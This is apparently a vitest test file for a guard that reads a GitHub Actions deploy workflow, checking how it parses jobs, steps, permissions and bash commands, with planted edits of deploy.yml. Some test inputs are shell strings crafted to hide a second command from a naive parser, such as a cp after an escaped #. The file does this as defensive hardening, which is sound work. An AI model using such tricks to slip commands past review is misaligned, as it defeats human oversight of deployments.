// The deploy-workflow guard's cases (DPW-01 to DPW-14; C0.11, TECH-SPEC T24 items 20 to 23 and 28). The
// reader first finds the seventeen jobs and their steps, and reads every canonical text back exactly, and
// DPW-02 refuses any line in a shape it doesn't read, so a reformatted workflow fails rather than passing
// unread. Then each case is proved on planted text, an exact edit of the real file as the rules read it, every
// shared run written out, that throws when its anchor is gone, and run again in the shared layout (each run
// RUN_ANCHORS names anchored on its first step and aliased at the rest), where it must find the same, before it
// holds the repository.
// AWS_CHECK runs with bash and jq against planted AWS answers and a real git, ASSET_CHECK against
// planted copies of the workload's own assembly, protect-environments.sh check --from against planted
// answers, and history.ts's plan is driven for the gate's refusals. Every commit is made in a scratch
// repository, and nothing names an account, a login or an address. Last, `.claude/settings.json`'s deny
// rules are read for a `:*` anywhere but at a Bash rule's end (C11-D77), which Claude Code reads literally,
// and `.claude/` is held to carry no plugin and its settings to enable none and name no marketplace.
// This file and deploy-workflow.ts are on the owner's-read list (C11-D74).
import { execFileSync, spawnSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { cpSync, existsSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import {
  gitIsAncestor,
  PLAN_OUTPUTS,
  type PlanInput,
  parsePullChecks,
  parseReleaseRecords,
  plan,
} from '../../infra/scripts/deploy/history.ts'
import { PROFILES } from '../../infra/src/config/profiles.ts'
import { synthWorkload } from '../../infra/src/testing/workload.ts'
import {
  actionUrl,
  run as checkActionPins,
  deployPinProblems,
  gitEnvironment,
  lsRemote,
  pinProblems,
  readTagRefs,
  tagCommit,
} from '../check-action-pins.ts'
import { checkoutDrift } from '../checkout-blobs.ts'
import { AGENT_MARKERS } from '../owner-bootstrap/target.ts'
import { ACTION_PINS, ACTION_SHAPE, PIN_SHAPE, PINS_JOB_ACTIONS } from './action-pins.ts'
import {
  ALIAS_MIN_BYTES,
  ARTIFACT_CALLS,
  ARTIFACT_NAMES,
  ARTIFACTS_STEP,
  ASSEMBLY_FOLDERS,
  ASSET_CHECK,
  ASSET_CHECK_RUN,
  AWS_CHECK,
  actionPinFindings as actionPinFindingsOf,
  actionRepository,
  appendsOnly,
  artifactNamesRun,
  assetCheckFindings as assetCheckFindingsOf,
  awsNameLines,
  BLOB_RESET,
  BOT_TEST,
  CANONICAL_BY_NAME,
  CDK_DEPLOY_DOWN,
  CDK_DEPLOY_DRILL,
  CDK_DEPLOY_FORWARD,
  CDK_DEPLOY_ROLLBACK,
  CDK_DEPLOY_SERVICES,
  CDK_DIFF_DOWN,
  CDK_DIFF_PROD,
  CDK_DIFF_ROLLBACK,
  CDK_FOLDER,
  CI,
  CLI_CHECK,
  CLI_FETCH,
  CLI_PIN_DRIFT,
  canonicalCommandLines,
  canonicalTextFindings,
  canonicalToolLines,
  checkoutFindings as checkoutFindingsOf,
  cliStacksOf,
  codeLinesAsBash,
  credentialedCodeFindings as credentialedCodeFindingsOf,
  credentialJobFindings as credentialJobFindingsOf,
  DEPLOY,
  DEPLOY_WORDS,
  DIFF_CUT,
  DIFF_RUN,
  DUE_ENVS,
  deployStepFindings as deployStepFindingsOf,
  diffFormHolds,
  ENVIRONMENT_JOBS,
  envGivenLines,
  evaluatedLines,
  evaluateIf,
  exitingFunctions,
  type Finding,
  FORWARD_RUN,
  forbiddenWordFindings as forbiddenWordFindingsOf,
  foreignExpansionLines,
  functionDefinitions,
  functionNameLines,
  GENERAL_WORDS,
  GUARD,
  gateFindings as gateFindingsOf,
  gitAttributeFindings,
  IMAGE_CHECK,
  IMAGE_LAYOUT,
  IMAGE_UNPACK_RUN,
  JOB_IDS,
  JOB_IFS,
  JOB_OUTPUTS,
  jqIsHeld,
  jqPipedLines,
  jqPrintsOne,
  jqProgramIsHeld,
  jqUnreadLines,
  MAIN_CI,
  MASK_RUN,
  MIGRATE_LINES,
  maskingFindings as maskingFindingsOf,
  migrationRecord,
  NET_JQ,
  NEWEST_RELEASE,
  NVMRC,
  ONE_OFF,
  OVERRIDES_JQ,
  outsideEvaluations,
  ownLinesSetAnInput,
  PINNED_RUNS,
  PLAN_BASIS,
  PLAN_CALL,
  PREAMBLE,
  PROBE,
  PROBE_LINES,
  PROTECT_ENVIRONMENTS_SHA256,
  PROTECT_ENVIRONMENTS_SHEBANG,
  PULL_CHECKS,
  permissionFindings as permissionFindingsOf,
  pinnedScriptText,
  probeRun,
  prodDiffStackFindings,
  prodPathFindings as prodPathFindingsOf,
  READ_BACK,
  REPO_FOLDER,
  RESTORE_DOWN,
  RESTORE_DOWN_DIFF,
  ROLLBACK_DIFF_RUN,
  RULESET,
  RUN_ANCHORS,
  RUN_TASK_MIGRATE,
  RUN_TASK_PROBE,
  readerLines,
  readShell,
  readsAsBash,
  recordRun,
  releaseFindings as releaseFindingsOf,
  SHELL_TABLE,
  SKOPEO_COPY,
  SMOKE_ATTEMPT,
  STAGES,
  STEP_ENVS,
  STOP_COMMANDS,
  STOP_HEAD,
  type StepPlace,
  sharedRunComment,
  sharedRunsHold,
  shellCommands,
  shellViews,
  smokeRun,
  TARGETS_QUERY,
  TASKS_OUTPUTS,
  type Texts,
  TOOL_LINE_TEXTS,
  timeoutAndGroupFindings as timeoutAndGroupFindingsOf,
  triggerFindings as triggerFindingsOf,
  unheldRecordLines,
  verdictLines,
  WORKFLOW_BYTES,
  whatRunsText,
  wordAsRead,
  wordSplits,
  workflowSizeFindings,
} from './deploy-workflow.ts'
import { moduleImports } from './imports.ts'
import { gitAttributes, ownRepository, readRepoFile, repoFiles, root } from './repo-files.ts'
import {
  commentLines,
  expandRunAliases,
  indicatorProblems,
  jobConcurrency,
  jobEnvironment,
  jobNeeds,
  jobPermissions,
  jobScalar,
  literalProblems,
  literalRun,
  parsedSteps,
  runAnchors,
  scalarValue,
  shapeProblems,
  workflowJobs,
  workflowTop,
  yamlLines,
} from './workflow.ts'

// differential() runs every finding function a second time, over deploy.yml's other layout, so a case that plants
// many texts takes about twice and a half what it took: each has 30 seconds by default, as many here already set.
vi.setConfig({ testTimeout: 30_000 })

const files = repoFiles()
const workflows: ReadonlyMap<string, string> = new Map(
  files.filter(path => /^\.github\/workflows\/[^/@]+\.ya?ml$/.test(path)).map(path => [path, readRepoFile(path)]),
)
// deploy.yml as committed, and as GitHub and the rules read it, every shared run written out (expandRunAliases()):
// every plant edits the second, so it is an edit of what GitHub runs, and differential() runs it again with the
// shared runs aliased as the committed layout aliases them.
const committedDeploy = readRepoFile(DEPLOY)
const deployText: string = expandRunAliases(committedDeploy)
const rulesetText = readRepoFile(RULESET)
const environments: ReadonlyMap<string, string> = new Map(
  files.filter(path => path.startsWith('.github/environments/')).map(path => [path, readRepoFile(path)]),
)
const protectEnvironments = readRepoFile('scripts/protect-environments.sh')
// Every workspace's package.json, read from the root's workspaces globs (a folder, or a folder's children
// by a trailing /*), and the root's own.
const workspaceGlobs = (JSON.parse(readRepoFile('package.json')) as { workspaces?: unknown }).workspaces
const workspacePattern = new RegExp(
  `^(?:${(Array.isArray(workspaceGlobs) ? workspaceGlobs : [])
    .map(glob =>
      String(glob)
        .replace(/[.+?^${}()|[\]\\]/g, '\\$&')
        .replace(/\/\*$/, '/[^/]+'),
    )
    .join('|')})/package\\.json$`,
)
const manifests: ReadonlyMap<string, string> = new Map(
  files.filter(path => path === 'package.json' || workspacePattern.test(path)).map(path => [path, readRepoFile(path)]),
)
const lockfile = readRepoFile('package-lock.json')

// The real text with one exact edit: `from` replaced where it first appears after `after` (or anywhere,
// with no anchor). Either missing throws, so a plant never passes by editing nothing.
function edited(text: string, from: string, to: string, after = ''): string {
  const start = text.indexOf(after)
  if (start < 0) throw new Error(`planted edit: no anchor ${JSON.stringify(after.slice(0, 80))}`)
  const at = text.indexOf(from, start)
  if (at < 0) throw new Error(`planted edit: no text ${JSON.stringify(from.slice(0, 80))}`)
  return text.slice(0, at) + to + text.slice(at + from.length)
}

const withText = (path: string, text: string): ReadonlyMap<string, string> =>
  new Map([...workflows].map(([each, real]) => [each, each === path ? text : real]))

// The workflows with one exact edit to one of them (deploy.yml, as the rules read it, unless named).
const plant = (from: string, to: string, after = '', path = DEPLOY) =>
  withText(path, edited(path === DEPLOY ? deployText : (workflows.get(path) ?? ''), from, to, after))

// --- The shared runs' two layouts (DPW-02, round 13) -------------------------------------------------------

// The steps of a workflow's jobs whose run is a block scalar written run: | at eight spaces, each with its job,
// its name, its run line (by index) and the line after its last line of content (the last line deeper than the
// key before one that isn't, blanks aside), read on YAML lines as workflow.ts's runAnchors() reads a step's run
// line.
function blockRuns(text: string): Array<{ line: number; end: number; place: StepPlace }> {
  const lines = text.split('\n')
  const yaml = new Set(yamlLines(text).map(line => line.index))
  const runs: Array<{ line: number; end: number; place: StepPlace }> = []
  let inJobs = false
  let inSteps = false
  let id: string | undefined
  let step: (StepPlace & { named: boolean }) | undefined
  lines.forEach((line, i) => {
    if (!yaml.has(i)) return
    if (/^\S/.test(line)) {
      inJobs = /^jobs:\s*(?:#.*)?$/.test(line)
      ;[id, inSteps, step] = [undefined, false, undefined]
      return
    }
    if (!inJobs) return
    if (/^ {2}\S/.test(line)) {
      ;[id, inSteps, step] = [/^ {2}([\w-]+):\s*(?:#.*)?$/.exec(line)?.[1], false, undefined]
      return
    }
    if (/^ {4}\S/.test(line)) {
      ;[inSteps, step] = [id !== undefined && /^ {4}steps:\s*(?:#.*)?$/.test(line), undefined]
      return
    }
    if (!inSteps || id === undefined) return
    if (/^ {6}- /.test(line)) step = { job: id, step: undefined, named: false }
    if (step === undefined) return
    const name = /^(?: {6}- | {8})name:(?:\s+(.*))?$/.exec(line)
    if (name && !step.named) [step.step, step.named] = [scalarValue(name[1] ?? ''), true]
    if (line !== '        run: |') return
    let end = i + 1
    for (let j = i + 1; j < lines.length && /^(?: {9}|\s*$)/.test(lines[j] ?? ''); j++) {
      if ((lines[j] ?? '').trim() !== '') end = j + 1
    }
    runs.push({ line: i, end, place: step })
  })
  return runs
}

// A written-out text (no anchor, alias or shared-run comment, else undefined) laid out as the committed file lays
// out its shared runs: for each RUN_ANCHORS entry, the steps whose run is that text written whole at ten spaces,
// where there are two or more, the first in file order anchored and the rest aliased, each under the comment
// sharedRunComment() writes. Its expansion must be the text byte for byte, or it throws, unless the text is in
// none of the reader's shapes (a plant of a shape the reader refuses, which needs no second layout).
function realiased(text: string): string | undefined {
  const shared = runAnchors(text)
  if (shared.anchors.length + shared.aliases.length + shared.comments.length > 0) return undefined
  if (/^\s*#\s*shared run\b/im.test(text)) return undefined
  const lines = text.split('\n')
  const runs = blockRuns(text).map(run => ({ ...run, block: lines.slice(run.line, run.end).join('\n') }))
  const edits = new Map<number, { lines: string[]; end: number }>()
  const place = ({ place: { job, step } }: (typeof runs)[number]): StepPlace => ({ job, step })
  for (const [name, entry] of Object.entries(RUN_ANCHORS())) {
    const written = `        run: |\n${indent(entry.text, 10)}`
    const group = runs.filter(run => !edits.has(run.line) && run.block === written)
    const [first, ...rest] = group
    if (first === undefined || rest.length === 0) continue
    edits.set(first.line, {
      lines: [...sharedRunComment('anchor', name, rest.map(place)), `        run: &${name} |`],
      end: first.line + 1,
    })
    for (const run of rest) {
      edits.set(run.line, {
        lines: [...sharedRunComment('alias', name, [place(first)]), `        run: *${name}`],
        end: run.end,
      })
    }
  }
  const out: string[] = []
  for (let i = 0; i < lines.length; ) {
    const edit = edits.get(i)
    out.push(...(edit?.lines ?? [lines[i] ?? '']))
    i = edit?.end ?? i + 1
  }
  const result = out.join('\n')
  if (expandRunAliases(result) === text) return result
  if (shapeProblems(text).length > 0) return undefined
  throw new Error('realiased: its expansion is not the text it was made from')
}

// deploy.yml's other layout: the committed file's expansion when it holds shared runs, or its shared runs aliased
// when it holds none; a planted text's shared runs aliased, or none for a plant that already holds a shared run
// or its comment (the reader's and DPW-02's own cases test those directly).
let committedOther: { text: string | undefined } | undefined
function otherLayout(text: string): string | undefined {
  if (text !== committedDeploy) return realiased(text)
  const shared = runAnchors(committedDeploy)
  committedOther ??= {
    text: shared.anchors.length + shared.aliases.length > 0 ? deployText : realiased(committedDeploy),
  }
  return committedOther.text
}
// A finding as either layout gives it: a line number (unreadCharacter's, deployPinProblems') read as any line.
const layoutFree = (found: readonly string[]) =>
  [...new Set(found.map(each => each.replace(/\bline \d+/g, 'line N')))].sort()
// A finding function that reads the workflows by path, called as given and again with deploy.yml in its other
// layout, which must find the same: a rule that read the stored file by job would see an aliased run in its
// anchor's job alone, and fail this in every case that plants into such a run.
function differential<A extends unknown[]>(
  name: string,
  find: (workflows: Texts, ...rest: A) => Finding[],
): (workflows: Texts, ...rest: A) => Finding[] {
  return (given: Texts, ...rest: A) => {
    const found = find(given, ...rest)
    const text = given.get(DEPLOY)
    const other = text === undefined ? undefined : otherLayout(text)
    if (other !== undefined && other !== text) {
      const again = find(new Map([...given].map(([path, each]) => [path, path === DEPLOY ? other : each])), ...rest)
      expect(layoutFree(again), `${name} over deploy.yml's other layout`).toEqual(layoutFree(found))
    }
    return found
  }
}
// Every finding function that reads the workflows by path, wrapped, but the size's, which counts the file as
// stored.
const actionPinFindings = differential('actionPinFindings', actionPinFindingsOf)
const assetCheckFindings = differential('assetCheckFindings', assetCheckFindingsOf)
const checkoutFindings = differential('checkoutFindings', checkoutFindingsOf)
const credentialedCodeFindings = differential('credentialedCodeFindings', credentialedCodeFindingsOf)
const credentialJobFindings = differential('credentialJobFindings', credentialJobFindingsOf)
const deployStepFindings = differential('deployStepFindings', deployStepFindingsOf)
const forbiddenWordFindings = differential('forbiddenWordFindings', forbiddenWordFindingsOf)
const gateFindings = differential('gateFindings', gateFindingsOf)
const maskingFindings = differential('maskingFindings', maskingFindingsOf)
const permissionFindings = differential('permissionFindings', permissionFindingsOf)
const prodPathFindings = differential('prodPathFindings', prodPathFindingsOf)
const releaseFindings = differential('releaseFindings', releaseFindingsOf)
const timeoutAndGroupFindings = differential('timeoutAndGroupFindings', timeoutAndGroupFindingsOf)
const triggerFindings = differential('triggerFindings', triggerFindingsOf)

const job = (id: string) => `\n  ${id}:\n`

// An action's pin as a workflow writes it, read from its table (ACTION_PINS unless given), and the same pin at
// another commit or under another version than its own: an action-pin PR moves deploy.yml, ci.yml and
// action-pins.ts alone, so no case here names a pin by its text (GUARDS-02, round 7).
const pinOf = (action: string, table: Readonly<Record<string, string>> = ACTION_PINS): string => {
  const pin = table[action]
  if (pin === undefined) throw new Error(`no pin for ${action}`)
  return `${action}@${pin}`
}
const atCommit = (pin: string, commit: string) => pin.replace(/@[0-9a-f]{40}/, `@${commit}`)
const nextVersion = (pin: string) =>
  pin.replace(/# v(\d+)\.(\d+)\.(\d+)$/, (_, major, minor, patch) => `# v${major}.${minor}.${Number(patch) + 1}`)

// A step's raw lines in deploy.yml: from its name's line to the next step or job.
function stepText(text: string, jobId: string, name: string): string {
  const jobAt = text.indexOf(job(jobId))
  const start = text.indexOf(`      - name: ${name}\n`, jobAt)
  if (jobAt < 0 || start < 0) throw new Error(`planted edit: no step ${name} in ${jobId}`)
  const end = /\n(?: {6}- | {2}\S)/g
  end.lastIndex = start + 1
  const next = end.exec(text)
  return text.slice(start, next === null ? text.length : next.index + 1)
}

// deploy.yml with a step taken out, moved before another of its job's, or copied into another job.
const removedStep = (jobId: string, name: string) =>
  withText(DEPLOY, edited(deployText, stepText(deployText, jobId, name), '', job(jobId)))
function movedStep(jobId: string, name: string, before: string) {
  const step = stepText(deployText, jobId, name)
  const without = edited(deployText, step, '', job(jobId))
  return withText(DEPLOY, edited(without, `      - name: ${before}\n`, `${step}      - name: ${before}\n`, job(jobId)))
}
function copiedStep(fromJob: string, name: string, toJob: string, before: string) {
  const step = stepText(deployText, fromJob, name)
  return withText(
    DEPLOY,
    edited(deployText, `      - name: ${before}\n`, `${step}      - name: ${before}\n`, job(toJob)),
  )
}
// deploy.yml with lines added to a step's run, before one of its lines (each with its indent).
function addedBefore(jobId: string, stepName: string, line: string, added: string) {
  const step = stepText(deployText, jobId, stepName)
  return withText(DEPLOY, edited(deployText, step, edited(step, line, `${added}${line}`), job(jobId)))
}

// What a run said on its stdout, line by line, but the stop-commands line STOP_HEAD prints first, which only
// the runner reads.
const STOP_LINE = /^::stop-commands::[0-9a-f]{32}$/
const spoken = (stdout: string): string[] =>
  stdout
    .trim()
    .split('\n')
    .filter(line => !STOP_LINE.test(line))

// DPW-02's finding for a file workflow.ts would read wrong.
const SHAPE =
  'is written in the shape workflow.ts reads: two-space block nesting, each key once in its mapping, each value whole on its line'
// DPW-02's findings for deploy.yml's mappings and its shared runs, and for a shared run in another workflow.
const BLOCK_MAPPINGS =
  "is written in block mappings: no flow mapping or quoted key, and no anchor, alias or merge key but a step's shared run (run: &name | and run: *name)"
const SHARED_RUNS = `${DEPLOY}: DPW-02 shares a step's run only as RUN_ANCHORS names it: each anchor a RUN_ANCHORS name holding that entry's text, of at least 1000 bytes, aliased by a later step at least once, and each anchor and alias under the comment sharedRunComment() writes for it, with no such comment elsewhere`
const EXPANDED_SHAPE = `${DEPLOY}: DPW-02 reads, with every shared run written out, in the shape workflow.ts reads: no anchor, alias or shared-run comment left, and every shared run a literal block scalar (run: |)`
const NO_SHARED_RUNS = (path: string) =>
  `${path}: DPW-02 writes no anchor or alias: only deploy.yml shares a step's run so`

// The findings for a run's own lines (every line outside a canonical text standing whole): one the table
// doesn't name, at its line (DPW-07, DPW-10, DPW-13), and a command not held to its uses (DPW-10, DPW-13).
const AS_BASH =
  'is written in the shell the guard reads: outside a canonical text standing whole, only what SHELL_TABLE names (blanks that are a space or a tab, its word characters, single and double quotes, its expansions of names bash neither sets nor reads for itself, substitutions, operators, redirections after a command’s word, keywords, tests, case patterns, functions and assignments, its builtins as it holds them, a comment only at a line’s start or after a blank), each stretch closing all it opens'
const HELD =
  'gives each command its own lines run only the flags and arguments the workflow uses (GLUE_USES), no assignment before it, and no file to read but the diff or to write but its outputs, its summary, the diff and /dev/null, so none runs code, reads a file the guard can’t see or writes one; and calls each check standing alone, outside any substitution, pipeline, negation, and-or list or condition, so its refusal ends the step'
// DPW-10's finding for an expression reading a step id, an output or a job that nothing writes (round 12).
const BINDING =
  "reads steps.<id> only from a step of its job (one before it, for a step) and an output only one that step writes, and needs.<job> only from a job it needs and only its result or outputs, since GitHub reads any other as ''"
// DPW-14's finding for a check called where its refusal wouldn't end the step, in any job.
const STANDS_ALONE =
  'calls each check standing alone, outside any substitution, pipeline, negation, and-or list or condition, so its refusal ends the step'
// The findings for a run the guard pins whole (PINNED_RUNS), under the rule that holds it, and for an output
// written outside one.
const PINNED_08 =
  "runs as written, whole and under its own if: (PINNED_RUNS): the pull request's checks, main's CI, the prod gate, prod's records, the smoke, services_started, the read-back, a rollback's releases and rolled, and the approver's diff, so no line of its own ends one early or writes an output or a file of its own"
const PINNED_09 =
  "runs as written, whole and under its own if: (PINNED_RUNS): the records, main's ruleset and the live environments the plan and prod-gate rest on and the plan itself, so no line of its own ends one early, skips one, forges what the plan reads or writes an output of its own"
// DPW-04's finding for ci.yml's job that holds the CDK CLI's pin (round 12).
const CLI_PIN_JOB_FINDING =
  "runs node scripts/check-cli-pin.ts \"$BASE\" in a job of its own, cli-pin, on GitHub's runner ubuntu-24.04, whose steps are only checkout of the whole history without credentials into repo and setup-node with Node from repo/.nvmrc and no cache, each at its commit and version comment in PINS_JOB_ACTIONS, and the check, in repo after CLI_PIN_DRIFT, which refuses a checkout that isn't HEAD's blobs, and BLOB_RESET, on a pull request alone, with BASE the base branch's remote-tracking name, so nothing of the repository's, no package manager and no action the pins check can't prove runs before it; check needs it"
// DPW-04's finding for ci.yml's job that proves the pins (FETCH-A3-01, round 5's fourth attack).
const PINS_JOB_FINDING =
  "runs node scripts/check-action-pins.ts in a job of its own, action-pins, on GitHub's runner ubuntu-24.04, whose steps are only checkout without credentials into repo and setup-node with Node from repo/.nvmrc and no cache, each at its commit and version comment in PINS_JOB_ACTIONS, and the check, in repo after BLOB_RESET, in a workflow that holds only name, on, permissions and jobs at its top (no env: or defaults:, which reach every step), so nothing of the repository's and no action the check can't prove runs before it; check needs it, runs under always() on ubuntu-24.04 with no key of its own but needs, if, runs-on, timeout-minutes and steps (no env:, defaults:, container:, services:, strategy: or continue-on-error:, which decide how its steps run or whether its failure counts), and first fails, by that step's if: and exit 1 alone, when a job it needs didn't succeed"
// ci.yml's two checks as their steps write them (round 12's fourth iteration): in the checkout's folder, after
// the working tree is reset to its blobs.
const RESET_LINES = `          printf '* -text -eol -ident -filter -working-tree-encoding\\n' >.git/info/attributes
          git read-tree HEAD
          git checkout-index --all --force
`
const PINS_LINE = '          node scripts/check-action-pins.ts\n'
const PINS_STEP = `      - working-directory: repo\n        run: |\n${RESET_LINES}${PINS_LINE}`
const PINNED_13 =
  'runs as written, whole and under its own if: (PINNED_RUNS) and in its own folder: the build, the synth, the release, the push, migrate with its record and the record job, so no line of its own builds, synthesises, tags, migrates or records by another commit, context, task or environment, or runs, prints or writes what a rule reading the text would miss'
const UNPINNED = 'runs only what PINNED_RUNS pins whole: no run of deploy.yml has a line of its own'
// DPW-13's finding for a line of a record's writer that sets a name, runs jq or calls gh off the guard's own
// literals (the seventh review's fourth attack).
const RECORD_LINES =
  'sets a name, runs jq or calls gh in a record’s writer only on a line RECORD_JOB_LINES or migrationRecordLines() holds, so nothing rewrites what a record says'
const PINNED_10 =
  'runs as written, whole and under its own if: (PINNED_RUNS): every run of a job that holds the deploy role, or the OIDC request token that gets it, so no line of its own reads, splits, prints or sends what the job holds or hands a pinned line another input'
const OUTPUT_PINNED = 'writes an output only from a run the guard pins whole'

const indent = (text: string, n: number) =>
  text
    .split('\n')
    .map(line => (line === '' ? '' : `${' '.repeat(n)}${line}`))
    .join('\n')

describe('DPW: the guard reads the deploy workflow', () => {
  const STEPS: Readonly<Record<string, number>> = {
    gate: 7,
    build: 11,
    synth: 6,
    'synth-previous-nonprod': 6,
    'synth-previous-prod': 6,
    nonprod: 22,
    'smoke-nonprod': 3,
    'rollback-nonprod': 14,
    'resmoke-nonprod': 3,
    'record-nonprod': 1,
    'prod-plan': 13,
    'prod-gate': 6,
    prod: 22,
    'smoke-prod': 3,
    'rollback-prod': 14,
    'resmoke-prod': 3,
    'record-prod': 1,
  }

  it('finds the seventeen jobs in order and every step of each, parsed alike by both readers', () => {
    const jobs = workflowJobs(deployText)
    expect(jobs.map(each => each.id)).toEqual([...JOB_IDS])
    for (const each of jobs) {
      expect(each.steps.length, each.id).toBe(STEPS[each.id])
      expect(parsedSteps(each).length, each.id).toBe(STEPS[each.id])
    }
    expect([...workflowTop(deployText).keys()]).toEqual(['name', 'on', 'permissions', 'jobs'])
  })

  it('reads the canonical texts back through parsedSteps exactly as written, comment and blank lines kept', () => {
    const texts = { PREAMBLE, ASSET_CHECK, CDK_FOLDER, AWS_CHECK, CLI_FETCH, CLI_CHECK, ONE_OFF, PROBE }
    const planted = [
      'jobs:',
      '  x:',
      '    runs-on: ubuntu-24.04',
      '    steps:',
      ...Object.entries(texts).flatMap(([name, text]) => [
        `      - name: ${name}`,
        '        run: |',
        indent(`${text}\n\n# a closing comment`, 10),
      ]),
      '  # the next job',
      '  y:',
      '    steps:',
      '      - run: true',
    ].join('\n')
    const [first] = workflowJobs(planted)
    if (first === undefined) throw new Error('the planted workflow has a job')
    const steps = parsedSteps(first)
    expect(steps.map(step => step.name)).toEqual(Object.keys(texts))
    for (const step of steps) {
      expect(step.run).toBe(`${texts[step.name as keyof typeof texts]}\n\n# a closing comment`)
      expect(step.lines.at(-1)?.trim()).toBe('# a closing comment')
    }
    // And in the real file, where each sits whole in the steps that run it.
    const runs = workflowJobs(deployText).flatMap(each => parsedSteps(each).map(step => step.run ?? ''))
    for (const text of [
      PREAMBLE,
      ASSET_CHECK,
      CDK_FOLDER,
      AWS_CHECK,
      CLI_FETCH,
      CLI_CHECK,
      ONE_OFF,
      PROBE,
      TASKS_OUTPUTS,
    ]) {
      expect(runs.some(run => run.includes(text))).toBe(true)
    }
    for (const line of [
      CDK_DEPLOY_FORWARD,
      CDK_DEPLOY_SERVICES,
      CDK_DEPLOY_DRILL,
      CDK_DEPLOY_ROLLBACK,
      CDK_DEPLOY_DOWN,
      CDK_DIFF_PROD,
      CDK_DIFF_ROLLBACK,
      RUN_TASK_MIGRATE,
      RUN_TASK_PROBE,
      NET_JQ.migrate,
      NET_JQ.probe,
      OVERRIDES_JQ,
      SKOPEO_COPY,
    ]) {
      expect(
        runs.some(run => run.split('\n').some(each => each.trim() === line)),
        line,
      ).toBe(true)
    }
    expect(PROBE).toContain(TARGETS_QUERY)
    expect(RESTORE_DOWN).toContain(CDK_DEPLOY_DOWN)
  })

  it('reads job keys, environments, permissions, needs and concurrency on planted text', () => {
    const planted = [
      'jobs:',
      '  a:',
      '    needs: gate',
      '    environment: nonprod',
      '    permissions: write-all',
      '    concurrency: deploy-nonprod',
      '    steps:',
      '      - run: true',
      '  b:',
      '    needs: [gate, build]',
      '    environment:',
      '      name: prod',
      '    permissions: {}',
      '    concurrency:',
      '      group: deploy-prod',
      '      cancel-in-progress: false',
      '      queue: max',
      '  c:',
      '    needs:',
      '      - gate',
      `    environment: \${{ inputs.target }}`,
      '    permissions:',
      '      id-token: write',
      '      contents: read',
      '  d:',
      '    environment: { name: prod }',
      '    permissions: read-all',
    ].join('\n')
    const [a, b, c, d] = workflowJobs(planted)
    if (a === undefined || b === undefined || c === undefined || d === undefined) throw new Error('four jobs')
    expect([jobNeeds(a), jobNeeds(b), jobNeeds(c), jobNeeds(d)]).toEqual([['gate'], ['gate', 'build'], ['gate'], []])
    // (b's block mapping is unreadable whatever its name, round 11: its deployment: false or url: is no rule's.)
    expect([jobEnvironment(a), jobEnvironment(b), jobEnvironment(c), jobEnvironment(d)]).toEqual([
      'nonprod',
      { unreadable: true },
      { expression: true },
      { unreadable: true },
    ])
    expect([jobPermissions(a), jobPermissions(b), jobPermissions(d)]).toEqual(['write-all', '{}', 'read-all'])
    expect(jobPermissions(c)).toEqual(
      new Map([
        ['id-token', 'write'],
        ['contents', 'read'],
      ]),
    )
    expect(jobConcurrency(a)).toEqual({ group: 'deploy-nonprod', cancelInProgress: undefined, other: [] })
    expect(jobConcurrency(b)).toEqual({ group: 'deploy-prod', cancelInProgress: 'false', other: ['queue'] })
    expect(a.keyNames).toEqual(['needs', 'environment', 'permissions', 'concurrency', 'steps'])
  })

  it('reads a run as bash does: comments, quoted text and case patterns are no commands; substitutions are', () => {
    const run = [
      '# node in a comment',
      'echo "node $(gh api x) docker" \'npx\' # bash',
      'case "$X" in',
      '  node | docker) jq . ;;',
      '  "$(readlink -f y)"/*) ;;',
      'esac',
      'if [[ "$a" =~ ^(node|x)$ ]] && ! run aws s3 ls; then CDK=1 env | sort; fi',
      "jq -n '",
      '  node docker',
      "' >x",
      'TOKEN="a-$GITHUB_RUN_ID-b"',
    ].join('\n')
    const words = shellCommands(run).map(command => [...command.prefixes, command.word].join(' '))
    expect(words).toEqual([
      'echo',
      'gh',
      'case',
      'jq',
      'readlink',
      'esac',
      '[[',
      'run aws',
      'CDK=1 env',
      'sort',
      'fi',
      'jq',
    ])
    expect(shellViews('echo "a # b" # c').text).toBe('echo "a # b"    ')
  })

  it('reads through a wrapper or a redirection before a command, and both spellings of a function', () => {
    const read = (run: string) => shellCommands(run).map(command => [...command.prefixes, command.word].join(' '))
    expect(read('command -p ./x.sh')).toEqual(['command -p ./x.sh'])
    expect(read('exec -a name ./x.sh')).toEqual(['exec -a name'])
    expect(read('time -p ./x.sh; nohup -- ./y.sh')).toEqual(['time -p ./x.sh', 'nohup -- ./y.sh'])
    expect(read('timeout -s KILL 5 ./x.sh')).toEqual(['timeout -s KILL 5'])
    expect(read('env -0')).toEqual(['env -0'])
    expect(read('2>/dev/null aws sts get-caller-identity')).toEqual(['2>/dev/null aws'])
    expect(read('</dev/null cp a b; x &>/dev/null y')).toEqual(['</dev/null cp', 'x'])
    expect(read('[ ! -L "$x" ] && echo 2')).toEqual(['[', 'echo'])
    expect(
      functionDefinitions('mask() { cat; }\nfunction run { :; }\nget () ( : )\nlocal x=() y\necho "f() {"'),
    ).toEqual([
      { name: 'mask', line: 0 },
      { name: 'run', line: 1 },
      { name: 'get', line: 2 },
    ])
  })

  // GUARDS-01: each way the reader once read past what bash runs; bash runs cp in every one.
  it('reads a # after an escape, a [[ or case as an argument and a case inside a substitution as bash does', () => {
    const read = (run: string) => shellCommands(run).map(command => [...command.prefixes, command.word].join(' '))
    expect(read('echo a\\ #;cp a b')).toEqual(['echo', 'cp'])
    // The line a backslash-newline continues starts no comment (its # is read as a word, which no rule allows).
    expect(read('echo ok\\\n#;cp a b')).toEqual(['echo', '#', 'cp'])
    expect(read('echo [[ ; cp a b ; echo ]]')).toEqual(['echo', 'cp', 'echo'])
    expect(read('echo \\\n[[ ; cp a b ; ]]')).toContain('cp')
    expect(read('X=$(echo case in\ncp a b)')).toEqual(['echo', 'cp'])
    expect(read('echo case in\ncp a b')).toEqual(['echo', 'cp'])
    // A real test and case still read as bash reads them: their operands and patterns are no commands.
    expect(read('if [[ "$a" == x ]]; then cp a b; fi\ncase "$b" in\n  cp) jq . ;;\nesac')).toEqual([
      '[[',
      'cp',
      'fi',
      'case',
      'jq',
      'esac',
    ])
    // A case on one line, several items on a line, and a case in an unquoted substitution are read too.
    expect(read('case x in x) cp a b;; esac')).toEqual(['case', 'cp', 'esac'])
    expect(read('case x in\n  x) :;; true) cp a b;;\nesac')).toEqual(['case', ':', 'cp', 'esac'])
    expect(read('X=$(\ncase x in x) cp a b;; esac)')).toEqual(['case', 'cp', 'esac'])
